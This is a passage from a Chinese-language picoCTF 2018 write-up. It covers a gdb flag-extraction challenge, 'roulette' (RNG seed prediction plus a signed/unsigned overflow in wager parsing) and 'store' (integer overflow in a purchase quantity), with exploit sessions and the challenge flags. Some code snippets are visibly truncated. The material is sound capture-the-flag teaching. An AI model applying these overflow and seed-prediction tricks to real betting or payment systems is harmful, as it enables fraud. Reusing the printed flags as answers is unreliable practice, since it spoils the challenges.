       0x00000000004008f6 :    mov    $0x4009d0,%edi                                                         
       0x00000000004008fb :    callq  0x400600                                                     
       0x0000000000400900 :    mov    $0x0,%eax                                                              
       0x0000000000400905 :    callq  0x400786                                                 
    ...
再反汇编`decrypt_flag`函数，在打印break-line直接下断点。
    (gdb) disas decrypt_flag                                                                                      
    ...                                               
       0x0000000000400896 :   mov    0x200b4b(%rip),%rdx        # 0x6013e8                        
       0x000000000040089d :   mov    -0x20(%rbp),%eax                                                       
       0x00000000004008a0 :   cltq                                                                          
       0x00000000004008a2 :   add    %rdx,%rax                                                              
       0x00000000004008a5 :   movb   $0x0,(%rax)                                                            
       0x00000000004008a8 :   mov    $0xa,%edi                                                              
       0x00000000004008ad :   callq  0x4005f0                                                  
       0x00000000004008b2 :   nop                                                                           
    ...
    (gdb) b *0x00000000004008a8                                                                                   
    Breakpoint 1 at 0x4008a8                                                                                      
    (gdb) r                                                                                                       
    Starting program: /problems/learn-gdb_3_f1f262d9d48b9ff39efc3bc092ea9d7b/run                                  
    Decrypting the Flag into global variable 'flag_buf'                                                           
    .....................................                                                                         
    Breakpoint 1, 0x00000000004008a8 in decrypt_flag ()
`printf "%s", (char *) flag_buf`打印`flag_buf`变量，得到flag。
    (gdb) printf "%s", (char *) flag_buf                                                                          
    picoCTF{gDb_iS_sUp3r_u53fuL_efaa2b29}
flag:`picoCTF{gDb_iS_sUp3r_u53fuL_efaa2b29}`
# roulette
## Question
> This Online
> [Roulette](https://2018shell2.picoctf.com/static/2d8417ef7707fec56592db02da54575e/roulette)
> Service is in Beta. Can you find a way to win $1,000,000,000 and get the
> flag?
> [Source](https://2018shell2.picoctf.com/static/2d8417ef7707fec56592db02da54575e/roulette.c).
> Connect with `nc 2018shell1.picoctf.com 5731`
### Hint
> There are 2 bugs!
## Solution
查看源码，发现出问题的地方有两个。
    long get_rand() {
      long seed;
      FILE *f = fopen("/dev/urandom", "r");
      fread(&seed, sizeof(seed), 1, f);
      fclose(f);
      seed = seed % 5000;
      if (seed  ");
        uint64_t l = 0;
        char c = 0;
        while(!is_digit(c))
          c = getchar();
        while(is_digit(c)) {
          if(l >= LONG_MAX) {
            l = LONG_MAX;
            break;
          }
          l *= 10;
          l += c - '0';
          c = getchar();
        }
        while(c != '\n')
          c = getchar();
        return l;
    }
这个函数会返回一个有符号长整型的值，但是，在中间的运算过程却使用了一个无符号的`uint64_t`。
所以当我们构造一个特别大的输入时，就可以造成溢出，使函数返回一个有符号的负数。
基于以上两个bug，我们就可以构造出满足以下要求的输入了。
    if(cash > ONE_BILLION) { // cash大于十亿
        printf("*** Current Balance: $%lu ***\n", cash);
        if (wins >= HOTSTREAK) {// 连胜次数大于等于三次
          puts("Wow, I can't believe you did it.. You deserve this flag!");
          print_flag();
          exit(0);
    }
预测随机数用的c程序
    #include 
    #include 
    int main(int argc, char *argv[]) {
        srand(atoi(argv[1]));
        int i = 0;
        for (i = 0; i :)
    How much will you wager?
    Current Balance: $611    Current Wins: 0
    > 611
    Choose a number (1-36)
    > 12
    Spinning the Roulette for a chance to win $1222!
    Roulette  :  12
    You chose correct!
    How much will you wager?
    Current Balance: $1222   Current Wins: 1
    > 1222
    Choose a number (1-36)
    > 23
    Spinning the Roulette for a chance to win $2444!
    Roulette  :  23
    Wow, you won!
    How much will you wager?
    Current Balance: $2444   Current Wins: 2
    > 2444
    Choose a number (1-36)
    > 34
    Spinning the Roulette for a chance to win $4888!
    Roulette  :  34
    Congrats!
    How much will you wager?
    Current Balance: $4888   Current Wins: 3
    > 3221225472
    Choose a number (1-36)
    > 25
    Spinning the Roulette for a chance to win $2147483648!
    Roulette  :  26
    WRONG
    If you keep it up, maybe you'll get the flag in 100000000000 years
    *** Current Balance: $1073746712 ***
    Wow, I can't believe you did it.. You deserve this flag!
    picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_8fb4d984}
flag:`picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_8fb4d984}`
# store
## Question
> We started a little
> [store](https://2018shell2.picoctf.com/static/52a992a4afd3bd8ad54489efbec0fd5c/store),
> can you buy the flag?
> [Source](https://2018shell2.picoctf.com/static/52a992a4afd3bd8ad54489efbec0fd5c/source.c).
> Connect with `2018shell1.picoctf.com 53220`.
### Hint
> Two's compliment can do some weird things when numbers get really big!
## Solution
也是一个整数溢出的问题，购买一个小额的商品，造成负数溢出就可以使自己的钱数增加。
但是……出题人好像忘记去掉一些东西，直接把flag放在了二进制可执行文件里，所以直接`strings`就能得到flag了=-=。
    ~ strings store |grep pico
    YOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_dbd42a50}
常规解法如下。
    Welcome to the Store App V1.0
    World's Most Secure Purchasing App
    [1] Check Account Balance
    [2] Buy Stuff
    [3] Exit
     Enter a menu selection
    2
    Current Auctions
    [1] I Can't Believe its not a Flag!
    [2] Real Flag
    1
    Imitation Flags cost 1000 each, how many would you like?
    10000000000000000
    Your total cost is: -1981284352
    Your new balance: 1981285452
    Welcome to the Store App V1.0
    World's Most Secure Purchasing App
    [1] Check Account Balance
    [2] Buy Stuff
    [3] Exit
     Enter a menu selection
    2
    Current Auctions
    [1] I Can't Believe its not a Flag!
    [2] Real Flag
    2
    A genuine Flag costs 100000 dollars, and we only have 1 in stock
    Enter 1 to purchase1
    YOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_dbd42a50}
flag:`picoCTF{numb3r3_4r3nt_s4f3_dbd42a50}`